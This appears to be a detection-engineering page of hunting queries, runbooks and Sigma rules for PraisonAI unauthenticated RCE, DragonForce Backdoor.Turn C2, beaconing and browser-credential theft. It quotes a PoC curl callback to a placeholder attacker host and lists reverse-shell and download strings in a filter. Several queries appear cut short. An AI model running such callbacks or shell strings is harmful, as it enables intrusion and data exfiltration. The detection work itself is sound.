PraisonAI Jobs-API RCE: agent server (python) spawns shell/network utility via execute_command AIExploitation High
Hunts the landing of GHSA-4869-x4pr-q22x: the PraisonAI Jobs API process executing OS commands through the execute_command tool, which ends in subprocess.Popen (shell_tools.py:33). Surfaces a praisonai-hosting python/uvicorn parent spawning curl/sh/bash/nc/python children — the exact behaviour of the PoC `curl http://<ATTACKER>/pwn?output=$(id)`. Rationale: Anchors on the article's exact chain: praisonai Jobs API -> execute_command -> shell_tools.py subprocess.Popen, and the PoC's curl callback. Parent-cmdline 'praisonai' + shell/network child is high-fidelity because an agent server should not be forking curl/sh outside the abused tool. Falcon cannot filter parent command line in the documented ProcessRollup2 schema, so it anchors on parent python + child binary (slightly broader). Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://cybersecuritynews.com/praisonai-vulnerability-exploited/
ATT&CKT1190 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate agentic workflows that intentionally enable execute_command to run curl/wget for data retrieval
  • Operators or CI pipelines launching praisonai from a shell, where the shell itself is the recorded parent
  • Health-check or self-test scripts bundled with the deployment that invoke curl against localhost
  • Container entrypoints where python supervises curl/sh for readiness probes
Response runbook
1) Triage: pull the full process tree on the host — confirm the parent is the praisonai Jobs API (port 8005 listener) and inspect the child ChildCmd for outbound URLs, command substitution output, or recon commands (id/whoami/uname). 2) Contain: isolate the host, kill the agent server process, and block the egress destination seen in the child command line; rotate any credentials/API keys reachable from that host. 3) Hunt: review web/proxy logs for POST /api/v1/runs from the same source IP (UC2), search other praisonai hosts for the same parent->shell pattern, and grep submitted YAML/app logs for the string 'approve' listing execute_command.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has "praisonai" or InitiatingProcessFolderPath has "praisonai"

Unauthenticated POST to PraisonAI Jobs API (/api/v1/runs, port 8005) AIDelivery Medium
Hunts inbound requests to the credential-less PraisonAI Jobs endpoint POST /api/v1/runs on its default port 8005 — the unauthenticated entry point of GHSA-4869-x4pr-q22x. Mass-scanning of this exact endpoint was reported within hours of disclosure, so external callers are a strong pre-exploit signal. Rationale: Uses the article's concrete endpoint (POST /api/v1/runs) and documented default port 8005. The WAF/proxy query catches the path+method exactly; the Defender/Falcon network queries surface external callers reaching the Jobs API listener when no L7 logging exists. Datadog relies on free-text syslog because no dedicated web-access source is available in this tenant's schema. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://cybersecuritynews.com/praisonai-vulnerability-exploited/
ATT&CKT1190
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate internal automation or schedulers that submit jobs to /api/v1/runs
  • Uptime/health monitoring probes hitting the Jobs API endpoint
  • Authorized internal load testing of the agent platform
  • Corporate proxy or API gateway aggregating many users' calls behind a single source IP
Suppression filter
| where RequestClientApplication !has "HealthCheck" and RequestClientApplication !has "kube-probe"
Response runbook
1) Triage: identify the SourceIP — is it internal/known-automation or external? Check the user agent (scanners self-identify, e.g. CVE-Detector/1.0) and whether the same IP hit the endpoint repeatedly or from a hosting/VPS ASN. 2) Contain: if external/unknown, block the source at the WAF/edge and require auth on the Jobs API (apply Fix 1 — Depends(verify_token)); restrict 8005 to an allowlist. 3) Hunt: correlate the timestamp with UC1 process-spawn events on the destination host to confirm whether a request led to command execution, and review request bodies/app logs for the 'approve: [execute_command]' bypass payload.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"

| summarize Connections = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, LocalPort, InitiatingProcessFileName
| order by Connections desc

Exposure hunt: vulnerable PraisonAI package installed (praisonai <= 4.6.48 / praisonaiagents < 1.6.59) AIReconnaissance Medium
Inventory-side hunt for hosts running the versions affected by GHSA-4869-x4pr-q22x (no patched release at disclosure). Identifies the attack surface so the Jobs API can be authenticated/firewalled before mass-scanners reach it. Rationale: Uses the article's exact affected version boundaries (praisonai <= 4.6.48, praisonaiagents < 1.6.59) for a precise exposure query. parse_version gives correct semantic comparison rather than lexical string compare. Low FP because the package name + version range are specific to the advisory. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://advisories.gitlab.com/pkg/pypi/praisonai/CVE-2026-39890/ • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Air-gapped or internal-only dev boxes where the Jobs API is not network-exposed (vulnerable but lower risk)
  • Hosts where praisonai is installed in a virtualenv that TVM reports but the Jobs API service is never started
  • Version strings with local/build suffixes that parse_version may normalize unexpectedly
  • Decommissioned hosts still appearing in the inventory snapshot
Response runbook
1) Triage: for each hit, confirm whether the Jobs API is actually running and internet-reachable (check listener on 8005 and edge exposure) — prioritize internet-facing hosts. 2) Contain: since no fixed version exists, apply mitigations — enforce Depends(verify_token) on the Jobs router, restrict the 'approve' YAML field to a safe allowlist, and firewall 8005 to trusted callers. 3) Hunt: on every exposed host, run UC1 and UC2 retroactively to determine whether the endpoint was already probed or commands already executed.
DeviceTvmSoftwareInventory
| where SoftwareName has "praisonai"
| extend ParsedVersion = parse_version(SoftwareVersion)
| where (SoftwareName =~ "praisonai" and ParsedVersion <= parse_version("4.6.48"))
    or (SoftwareName =~ "praisonaiagents" and ParsedVersion < parse_version("1.6.59"))
| project DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, OSPlatform, EndOfSupportStatus
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where SoftwareName has "praisonai"
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel
| order by TimeGenerated desc

Exposed PraisonAI MCP SSE listener accepting non-loopback connections AIDelivery Medium
Hunts a PraisonAI Python/uvicorn MCP server (run_sse / launch_tools_mcp_server) that bound to 0.0.0.0 and is accepting inbound TCP connections from anything other than localhost. Per GHSA-x227-pf99-vffg the SSE transport ships with no auth and no Origin check, so any non-loopback reachability is the exploitable exposure precondition. Rationale: Anchors on the article's exact exposure: a praisonai-tagged Python/uvicorn process (InitiatingProcessCommandLine has 'praisonai') accepting inbound connections from a non-loopback peer — exactly the 0.0.0.0 default + no-auth condition GHSA-x227-pf99-vffg flags. Falcon variant can only anchor on python (no parent-cmdline field in FDR) so it is broader. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.csoonline.com/article/4171215/praisonai-vulnerability-gets-scanned-within-4-hours-of-disclosure.html • https://www.ibm.com/support/pages/node/7268889 • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1133
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Intentional internal deployment where the MCP server is reachable on the LAN for legitimate multi-host agent orchestration
  • Container/k8s networking where the peer IP is a sidecar or service-mesh proxy rather than localhost
  • Local health-check/monitoring agent probing the port from the host's primary NIC IP instead of 127.0.0.1
  • Developer testing the SSE endpoint from a second machine on the same subnet
  • Reverse proxy on a separate host fronting the MCP server (auth may be enforced at the proxy)
Suppression filter
| where not(ipv4_is_match(RemoteIP, "10.0.0.0/8") or ipv4_is_match(RemoteIP, "172.16.0.0/12") or ipv4_is_match(RemoteIP, "192.168.0.0/16"))  // keep only non-RFC1918 peers if internal LAN reach is sanctioned
Response runbook
1) Triage: confirm the process is a PraisonAI MCP SSE server and check the bind address and version (praisonaiagents < 1.6.59 is vulnerable); enumerate the RemoteIPs that reached it and whether they are expected operators. 2) Contain: firewall the listening port to localhost / trusted CIDRs, restart the server bound to 127.0.0.1, and upgrade praisonaiagents to >= 1.6.59 (which wires in SecurityConfig). 3) Hunt: pivot on the same host for tools/call traffic (UC2) and for the MCP Python process spawning shells/file writes (UC3) indicating the exposure was already exploited.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where InitiatingProcessFileName has_any ("python","python3","python.exe","uvicorn")
| where InitiatingProcessCommandLine has "praisonai"
| where not(ipv4_is_match(RemoteIP, "127.0.0.0/8")) and RemoteIP != "::1"
| summarize Connections=count(), RemoteIPs=make_set(RemoteIP,20), FirstSeen=min(Timestamp), LastSeen=max(Timestamp) by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, LocalPort
| order by Connections desc

| where InitiatingProcessCommandLine has "praisonai"

| summarize Connections=count(), RemoteIPs=make_set(RemoteIP,20), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Connections desc

Unauthenticated MCP SSE JSON-RPC tool invocation (/sse + /messages/ no Authorization) AIExploitation High
Hunts the GHSA-x227-pf99-vffg exploitation traffic: an SSE handshake on /sse followed by JSON-RPC POSTs to /messages/?session_id=<sid> carrying no Authorization header. This is the unauthenticated tools/list + tools/call path that yields RCE on PraisonAI servers exposing file/shell/code-exec tools. Rationale: Uses the exact PoC URIs from the advisory (/sse handshake then /messages/?session_id=) plus the article's 'No Authorization header anywhere' invariant (ImWebSession HttpRequestHeaderAuthorization is empty) — a highly specific, low-FP signature. Defender has no inbound HTTP-URL/header table for a server, so defender_kql is intentionally empty; Datadog/Falcon/CloudWatch omitted as they don't ship this reverse-proxy URL+header telemetry. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.ibm.com/support/pages/node/7268889 • https://www.vulncheck.com/advisories/microsoft-playwright-mcp-server-dns-rebinding-via-missing-origin-header-validation • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1189
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate MCP client (e.g. an internal agent orchestrator) that genuinely doesn't send Authorization because the deployment intentionally runs without auth on a trusted segment
  • Uptime/synthetic monitoring hitting /sse to verify the endpoint is alive
  • Security scanner or internal pentest probing the MCP endpoints
  • An MCP client that authenticates via a cookie or query-string token rather than the Authorization header
  • Another product unrelated to PraisonAI that happens to expose a /sse path (filter by DstHostname/port)
Suppression filter
| where SrcIpAddr !in ("10.0.0.5")  // exclude sanctioned internal MCP orchestrator/monitoring source IPs once identified during tuning
Response runbook
1) Triage: confirm DstHostname/port is a PraisonAI MCP server and inspect the request sequence — an initialize -> tools/list -> tools/call progression from an external SrcIpAddr with no auth is a live exploit. 2) Contain: block the source IP at the proxy/WAF, take the MCP server offline or rebind to 127.0.0.1, and upgrade praisonaiagents to >= 1.6.59. 3) Hunt: on the server host look for shell/code-exec children of the MCP Python process (UC3), new files written by it, and outbound C2; review which tools were registered to scope blast radius.
ImWebSession
| where TimeGenerated > ago(7d)
| where (Url has "/messages/" and Url has "session_id=") or (Url has "/sse")
| where isempty(HttpRequestHeaderAuthorization)
| summarize Requests=count(), Methods=make_set(HttpMethod,5), StatusCodes=make_set(HttpStatusCode,5), Urls=make_set(Url,10), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by SrcIpAddr, DstIpAddr, DstHostname
| where Requests > 1
| order by Requests desc

PraisonAI MCP Python server spawning a command shell (unauth tools/call RCE) AIInstallation Medium
Hunts the RCE realization of GHSA-x227-pf99-vffg: a PraisonAI Python/uvicorn MCP process (parent command line contains 'praisonai') spawning an OS shell (sh/bash/cmd/powershell). With file/shell/code-exec tools registered, an unauthenticated tools/call executes commands as a child of the agent process. Rationale: Anchors on the article's RCE statement ('with file/shell/code-exec tools this is RCE') by tying a praisonai-tagged Python/uvicorn parent (InitiatingProcessCommandLine/ParentProcessCommandLine has 'praisonai') to a shell child. Falcon FDR lacks a parent-cmdline field so its variant is python->shell only (broader); Datadog windows.sysmon covers Windows only, so Linux agent hosts need the Defender/ImProcessCreate variants. Cross-checked against: • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.ibm.com/support/pages/node/7268889 • https://attack.mitre.org/techniques/T1059/004/
ATT&CKT1059.004 T1059.001 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PraisonAI agents that legitimately use a code-interpreter or shell tool as part of their designed workflow
  • A python agent launching git/build subcommands via a shell wrapper during normal operation
  • Data-science notebooks or scripts under a path containing 'praisonai' invoking shell utilities
  • Operator running maintenance commands from the same venv whose argv contains 'praisonai'
  • CI jobs executing the praisonai CLI that shell out to test harnesses
Suppression filter
| where ProcessCommandLine has_any ("whoami","/bin/sh -c","-c ","curl ","wget ","bash -i","nc ","/dev/tcp/","powershell -e","Invoke-WebRequest")  // focus on shell children carrying recon/download/reverse-shell intent
Response runbook
1) Triage: inspect the child ProcessCommandLine — recon (whoami/id/curl), download, or reverse-shell strings against a server-side agent that should not be running interactive shells is a strong true positive; correlate timing with UC2 tools/call traffic. 2) Contain: isolate the host, kill the MCP server process tree, rotate any credentials/tokens accessible to the agent's service account, and rebind/upgrade praisonaiagents to >= 1.6.59. 3) Hunt: enumerate files written and network connections by the python parent, check for persistence (cron/systemd/Run keys) and lateral movement from the host, and review all registered MCP tools to bound capability abuse.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("python","python3","python.exe","uvicorn")
| where InitiatingProcessCommandLine has "praisonai"
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python","python3","uvicorn")
| where ParentProcessCommandLine has "praisonai"
| where ActingProcessName has_any ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

DragonForce Hackers Abuse Microsoft Teams Relays to Hide Backdoor.Turn C2 Traffic

The Hacker News
2026-06-18 15 use cases 5 techniques 6 kill-chain phases detected

DragonForce BYOVD: known-vulnerable driver (Huawei HWAuidoOs2Ec.sys et al.) dropped to disk AIInstallation High
Hunts the bring-your-own-vulnerable-driver stage DragonForce used to terminate security software before deploying Backdoor.Turn and ransomware. Matches the specific driver filenames named in the Symantec report — Huawei HWAuidoOs2Ec.sys ('Havoc Process Terminator'), Topaz wsftprm.sys (CVE-2023-52271), Tower of Fantasy GameDriverX64.sys (CVE-2025-61155) and K7 K7RKScan.sys (CVE-2025-1055) — being written to the filesystem. Rationale: Driver filenames are concrete, corroborated IOCs from Symantec/security.com and BleepingComputer (HWAuidoOs2Ec.sys also confirmed by Huntress in March 2026); a legitimately-signed-but-vulnerable .sys hitting disk with these exact names is high-fidelity BYOVD signal. C2 IPs from the source article were not independently confirmed so were intentionally not hardcoded. Cross-checked against: • https://www.security.com/threat-intelligence/dragonforce-msteams-backdoor • https://www.bleepingcomputer.com/news/security/ransomware-gang-abuses-microsoft-teams-relays-to-hide-malicious-traffic/ • https://www.securityweek.com/microsoft-teams-relay-servers-abused-in-dragonforce-ransomware-attack/
ATT&CKT1068 T1562.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Tower of Fantasy game install writing GameDriverX64.sys on a corporate gamer's workstation
  • K7 Security antivirus legitimately deploying K7RKScan.sys during product update
  • Topaz signature-pad/anti-fraud SDK installer dropping wsftprm.sys on a kiosk/POS host
  • Security researcher or red-team intentionally staging vulnerable-driver samples in a lab share
  • EDR/AV vendor quarantine copy of the driver being written under a sandbox path
Suppression filter
| where InitiatingProcessFileName !in~ ("msiexec.exe","k7sysmn1.exe","k7tsmngr.exe") and not(InitiatingProcessFolderPath has_any (@"\Program Files\",@"\Program Files (x86)\"))
Response runbook
1) Triage: pull InitiatingProcessFileName/FolderPath and signer of the writing process — a vulnerable driver dropped by powershell.exe, rundll32.exe or an unsigned binary in \Temp\\Public\ is malicious; a vendor MSI in Program Files is likely benign. Confirm whether the matching service/driver was subsequently loaded. 2) Contain: isolate the host, block/quarantine the driver hash, and verify Microsoft's vulnerable-driver blocklist (HVCI) is enforced; kill any process abusing the driver to terminate AV. 3) Hunt: on the same host look for DbgView64.exe network egress, Backdoor.Turn injection, AD recon and ransomware staging; sweep the fleet for the same driver hashes.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType == "FileCreated"
| where FileName in~ ("HWAuidoOs2Ec.sys","wsftprm.sys","GameDriverX64.sys","K7RKScan.sys")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessAccountName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType == "FileCreated"
| where TargetFileName in~ ("HWAuidoOs2Ec.sys","wsftprm.sys","GameDriverX64.sys","K7RKScan.sys")
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, TargetFileSHA256,
          ActorUsername, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Backdoor.Turn host: Sysinternals DebugView (DbgView64.exe) making outbound internet connections AICommand & Control High
Hunts the Backdoor.Turn C2 host signal — DragonForce injected the Go RAT into the legitimate Sysinternals DbgView64.exe process post-ransomware to retain access. DebugView is a local kernel-debug viewer that has no legitimate reason to reach public IPs, so any outbound internet connection initiated by DbgView64.exe is high-fidelity (covers the QUIC/TURN egress the backdoor performs). Rationale: DbgView64.exe as the injection target is named explicitly by Symantec/security.com and the source article; DebugView is a local-only debug viewer, so a public outbound connection from it is a near-unambiguous Backdoor.Turn host signal independent of the (unconfirmed) C2 IPs. Cross-checked against: • https://www.security.com/threat-intelligence/dragonforce-msteams-backdoor • https://www.bleepingcomputer.com/news/security/ransomware-gang-abuses-microsoft-teams-relays-to-hide-malicious-traffic/ • https://www.helpnetsecurity.com/2026/06/16/dragonforce-microsoft-teams-malware-backdoor-turn/
ATT&CKT1055 T1572
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Admin using DebugView's remote-agent (Dbgview /a) to monitor a host across sites where the peer resolves to a public IP
  • Telemetry/update check by a repackaged DebugView build pushed via software-deployment tooling
  • A renamed unrelated network tool masquerading as DbgView64.exe during sanctioned troubleshooting
  • Security tooling proxying DebugView traffic through a public egress gateway IP
Suppression filter
| where InitiatingProcessFolderPath !has_any (@"\Sysinternals\", @"\Program Files\") or RemotePort in (443, 3478, 3479, 3480, 3481)
Response runbook
1) Triage: confirm the process is the genuine signed Sysinternals DbgView64.exe and inspect the remote IPs/ports — UDP/443 (QUIC) or 3478-3481 (TURN) to Microsoft relay ranges then onward is the Backdoor.Turn pattern; capture parent process and recent module loads for injection evidence. 2) Contain: network-isolate the host, suspend/dump the DbgView64.exe process for memory forensics, and block the observed remote IPs at egress. 3) Hunt: pivot on the host for BYOVD driver drops, AD/LDAP enumeration, browser-credential theft and ransomware artifacts; sweep fleet for any DbgView64.exe with public network connections.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "DbgView64.exe"
| where RemoteIPType == "Public"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), ConnCount=count(),
            RemotePorts=make_set(RemotePort,20), RemoteIPs=make_set(RemoteIP,20), RemoteUrls=make_set(RemoteUrl,20)
            by DeviceName, InitiatingProcessFolderPath, InitiatingProcessAccountName, InitiatingProcessSHA256
| order by FirstSeen desc
ASCDeviceEvents
| where TimeGenerated > ago(30d)
| where InitiatingProcessFileName =~ "DbgView64.exe"
| where isnotempty(RemoteIP) and not(ipv4_is_private(RemoteIP))
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), ConnCount=count(),
            RemotePorts=make_set(RemotePort,20), RemoteIPs=make_set(RemoteIP,20)
            by DeviceName, InitiatingProcessFileName, AccountName
| order by FirstSeen desc

Ghost Calls relay abuse: non-Teams process initiating STUN/TURN (UDP 3478-3481) egress AICommand & Control Medium
Hunts the novel Backdoor.Turn C2 setup where the malware obtains a Teams visitor token and routes through Microsoft's TURN relay before a QUIC hop to the real C2. Catches injection-target variants beyond DbgView64.exe by flagging any process that is NOT a recognised Teams/conferencing binary initiating STUN/TURN traffic on UDP 3478-3481 to the internet. Rationale: The TURN-relay C2 (ports 3478-3481 / Ghost Calls technique) is the article's headline TTP, corroborated across Symantec, BleepingComputer and SecurityWeek; scoping to non-conferencing processes turns legitimate-looking Teams relay traffic into a process-anomaly pivot that survives if the backdoor injects into a host other than DbgView64.exe. Cross-checked against: • https://www.security.com/threat-intelligence/dragonforce-msteams-backdoor • https://www.bleepingcomputer.com/news/security/ransomware-gang-abuses-microsoft-teams-relays-to-hide-malicious-traffic/ • https://www.securityweek.com/microsoft-teams-relay-servers-abused-in-dragonforce-ransomware-attack/

Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Zoom, Cisco Webex or other WebRTC apps using STUN/TURN on 3478 for media negotiation
  • Browsers (chrome.exe/msedge.exe/firefox.exe) doing WebRTC STUN during video calls in web apps
  • Corporate VoIP/softphone clients (e.g. RingCentral, 8x8) establishing media via TURN
  • Peer-to-peer gaming or screen-share tooling negotiating NAT traversal on 3478-3481
  • A renamed/repackaged Teams client not on the allow-list initiating legitimate relay traffic
Suppression filter
| where InitiatingProcessFileName !in~ ("zoom.exe","webex.exe","webexhost.exe","chrome.exe","msedge.exe","firefox.exe","slack.exe","ringcentral.exe","softphone.exe") and InitiatingProcessFolderPath !has_any (@"\Program Files\", @"\Program Files (x86)\")
Response runbook
1) Triage: identify the initiating process and its signer/path — a non-conferencing or unsigned binary (or one in \Temp\\Public\\ProgramData) on 3478-3481 is suspicious; legitimate softphones/browsers are common benign hits. Check whether the same process later opens UDP/443 QUIC to a non-Microsoft IP. 2) Contain: isolate the host, capture the process for memory analysis (Backdoor.Turn injection), and block the downstream C2 IPs at egress. 3) Hunt: correlate with BYOVD driver drops, DbgView64.exe egress, AD enumeration and ransomware staging on the same host; baseline which processes legitimately use TURN in your environment and allow-list them.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemotePort between (3478 .. 3481)
| where RemoteIPType == "Public"
| where InitiatingProcessFileName !in~ ("ms-teams.exe","teams.exe","msteams.exe","outlook.exe","skype.exe","ms-teamsupdate.exe","msedgewebview2.exe")
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), ConnCount=count(),
            RemoteIPs=make_set(RemoteIP,20), RemotePorts=make_set(RemotePort,10)
            by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by FirstSeen desc
ASCDeviceEvents
| where TimeGenerated > ago(30d)
| where RemotePort between (3478 .. 3481)
| where isnotempty(RemoteIP) and not(ipv4_is_private(RemoteIP))
| where InitiatingProcessFileName !in~ ("ms-teams.exe","teams.exe","msteams.exe","outlook.exe","skype.exe","ms-teamsupdate.exe","msedgewebview2.exe")
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), ConnCount=count(),
            RemoteIPs=make_set(RemoteIP,20)
            by DeviceName, InitiatingProcessFileName, AccountName
| order by FirstSeen desc
title: Non-Teams Process Initiating STUN/TURN Egress (Backdoor.Turn Ghost Calls)
id: e3a9c772-6f1b-4d50-9a3e-8c41b0f2a6d7
status: experimental
description: Flags processes other than Teams/conferencing binaries connecting to STUN/TURN UDP ports 3478-3481, the relay setup used by DragonForce Backdoor.Turn
references:
  - https://www.security.com/threat-intelligence/dragonforce-msteams-backdoor
  - https://thehackernews.com/2026/06/dragonforce-hackers-abuse-microsoft.html
author: SOC Detection Engineering
date: 2026/06/20
tags:
  - attack.t1572
  - attack.t1090
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort:
      - 3478
      - 3479
      - 3480
      - 3481

    Image|endswith:
      - '\ms-teams.exe'
      - '\teams.exe'
      - '\msteams.exe'
      - '\outlook.exe'
      - '\skype.exe'
      - '\ms-teamsupdate.exe'
      - '\msedgewebview2.exe'
  condition: selection and not filter_legit
level: medium
source:windows.sysmon @EventID:3 @DestinationPort:[3478 TO 3481] AND NOT @Image:(*\\ms-teams.exe OR *\\MS-Teams.exe OR *\\teams.exe OR *\\Teams.exe OR *\\msteams.exe OR *\\outlook.exe OR *\\OUTLOOK.EXE OR *\\skype.exe OR *\\ms-teamsupdate.exe OR *\\msedgewebview2.exe)
#event_simpleName=NetworkConnectIP4
| RemotePort>=3478
| RemotePort<=3481
| NOT (ContextImageFileName=/\\(ms-teams|teams|msteams|outlook|skype|ms-teamsupdate|msedgewebview2)\.exe$/i)
| NOT cidr("10.0.0.0/8", field=RemoteAddressIP4)
| NOT cidr("172.16.0.0/12", field=RemoteAddressIP4)
| NOT cidr("192.168.0.0/16", field=RemoteAddressIP4)
| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())

| `drop_dm_object_name(All_Traffic)`
| search NOT (dest="10.0.0.0/8" OR dest="172.16.0.0/12" OR dest="192.168.0.0/16")

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port>=3478 AND All_Traffic.dest_port<=3481 AND All_Traffic.transport=udp AND NOT (All_Traffic.process_name IN ("ms-teams.exe","teams.exe","msteams.exe","Teams.exe","outlook.exe","skype.exe","ms-teamsupdate.exe")) by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.process_name

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`

| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
